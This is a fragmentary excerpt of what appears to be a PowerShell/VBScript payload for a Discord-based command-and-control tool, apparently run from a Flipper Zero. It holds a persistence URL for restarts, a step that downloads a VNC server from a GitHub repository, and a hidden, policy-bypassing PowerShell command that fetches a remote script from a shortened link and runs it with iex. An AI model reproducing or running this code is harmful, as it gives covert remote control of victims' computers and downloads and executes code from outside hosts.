...
$parent = "https://is.gd/M1Ul40" # parent script URL (for restarts and persistance)
...
Function StartUvnc{
    ...
    $vncDownload = "https://github.com/kali8534/Flipper-DiscordC2/raw/main/winvnc.zip"
...
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  ...
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; irm https://is.gd/EOSNwa | iex`", 0, True
"@
